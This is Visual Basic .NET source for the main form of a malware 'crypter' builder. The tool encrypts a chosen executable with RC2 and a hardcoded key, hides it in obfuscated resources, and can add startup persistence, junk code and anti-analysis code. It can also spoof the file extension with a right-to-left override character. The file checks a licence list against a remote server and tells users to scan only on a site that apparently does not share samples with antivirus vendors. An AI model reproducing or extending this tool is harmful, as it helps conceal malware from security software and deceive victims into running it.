Imports System.Resources
Imports System.Text
Imports System.IO
Imports System.Net
Imports System.Security.Cryptography

Public Class Form1
    Private Sub FlowButton4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton4.Click
        Me.Close()
    End Sub

    Private Sub FlowButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton1.Click
        Dim ExeOpen As New OpenFileDialog
        ExeOpen.Filter = "Executables|*.exe"
        If ExeOpen.ShowDialog() = DialogResult.OK Then
            ExePath.Text = ExeOpen.FileName
        End If
    End Sub

    Private Sub FlowButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton2.Click
        Dim IconOpen As New OpenFileDialog
        IconOpen.Filter = "Icon files|*.ico"
        If IconOpen.ShowDialog() = DialogResult.OK Then
            IconPath.Text = IconOpen.FileName
            PictureBox1.ImageLocation = IconOpen.FileName
        End If
    End Sub

    Private Sub FlowButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton3.Click
        Dim SaveExe As New SaveFileDialog
        SaveExe.Filter = "Executables|*.exe"
        If SaveExe.ShowDialog() = DialogResult.OK Then
            Dim source As String = My.Resources.Source
            Dim encr As String = Convert.ToBase64String(CustEncDec(File.ReadAllBytes(ExePath.Text), "JXqMoylT"))
            Dim res As ResourceWriter = New ResourceWriter("KMCwauTPggOARWEckhFx.resources")
            res.AddResource("EgCtNlVduQFoCZgZxwkc", encr)
            res.AddResource("cHuLkavphmuOhppMNuNQ", Convert.ToBase64String(CustEncDec(My.Resources.CrpMod, "JXqMoylT")))
            res.Close()
            If IsStartup.Checked Then source = source.Replace("False", "True")
            If Not cboxStartup.Text = "" Then
                source = source.Replace("%StarupName%", cboxStartup.Text)
            Else
                MsgBox("Custom Startup Name can not be empty.")
                Exit Sub
            End If

            If chkBoxJunk.Checked Then source = source.Replace("'' JUNK ''", My.Resources.junk)
            If chkBoxAntis.Checked Then source = source.Replace("'' ANTIS ''", My.Resources.antis)

            Dim icn As String = ""

            If IsIcon.Checked Then
                File.Copy(IconPath.Text, "icon.ico", True)
                icn = "icon.ico" 'IconPath.Text
            End If
            dwqeEQE3Q2.edasr232222dF(SaveExe.FileName, source, icn)
            Threading.Thread.Sleep(1000)
            MsgBox("Done", MsgBoxStyle.Information, "Success!")
            File.Delete("KMCwauTPggOARWEckhFx.resources")

            If chkExtSpoofer.Checked Then
                Dim str As String = SaveExe.FileName.Replace(".exe", "")
                File.Copy(SaveExe.FileName, str & "‮" & StrReverse(cboExtSpoofer.Text) & ".exe")
                File.Delete(SaveExe.FileName)
            End If

            If File.Exists("icon.ico") Then
                File.Delete("icon.ico")
            End If
        End If
    End Sub

    Public Shared Function CustEncDec(ByVal bytes As Byte(), ByVal Key As String) As Byte()
        Dim byteKey As Byte() = Encoding.ASCII.GetBytes(Key)
        Dim byteIV As Byte() = byteKey
        Dim MS As New MemoryStream()
        Dim CryptoMethod As New RC2CryptoServiceProvider()
        Dim CS As New CryptoStream(MS, CryptoMethod.CreateEncryptor(byteKey, byteIV), CryptoStreamMode.Write)
        CS.Write(bytes, 0, bytes.Length)
        CS.FlushFinalBlock()
        Return MS.ToArray()
    'Dim memoryStream As MemoryStream
    'Dim cryptoStream As CryptoStream
    'Dim rijndael__1 As Rijndael = Rijndael.Create()
    'Dim pdb As New Rfc2898DeriveBytes(Key, New Byte() {&H26, &HDC, &HFF, &H0, &HAD, &HED, _
    ' &H7A, &HEE, &HC5, &HFE, &H7, &HAF, _
    ' &H4D, &H8, &H22, &H3C})
    'rijndael__1.Key = pdb.GetBytes(32)
    'rijndael__1.IV = pdb.GetBytes(16)
    'memoryStream = New MemoryStream()
    'cryptoStream = New CryptoStream(memoryStream, rijndael__1.CreateEncryptor(), CryptoStreamMode.Write)
    'cryptoStream.Write(bytes, 0, bytes.Length)
    'cryptoStream.Close()
    'Return memoryStream.ToArray()
    End Function


    Private Sub FlowButton5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton5.Click
        MsgBox("Credits : MoonWalker" & vbCrLf & "               pr0t0typ3", MsgBoxStyle.Information, "About")
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        If MsgBox("I agree to scan crypted file on myavscan.net only.", MsgBoxStyle.YesNo, "Warning") = MsgBoxResult.Yes Then
        Else
            Me.Dispose()
        End If
        Dim wc As New WebClient
        wc.Proxy = Nothing
        Try
            Dim str As String = wc.DownloadString("http://chromecrypter.co.uk/ccv36.php")
            Select Case (str.Contains("noleechersfound"))
                Case True : Exit Select
                Case False : If str.Length < 50 Then
                        MsgBox(str)
                    Else
                        MsgBox("The database server is unreachable, please try again later.")
                    End If
                    Me.Dispose()
            End Select
        Catch ex As Exception
            MsgBox("The database server is unreachable, please try again later.")
            Me.Dispose()
        End Try
    End Sub


End Class
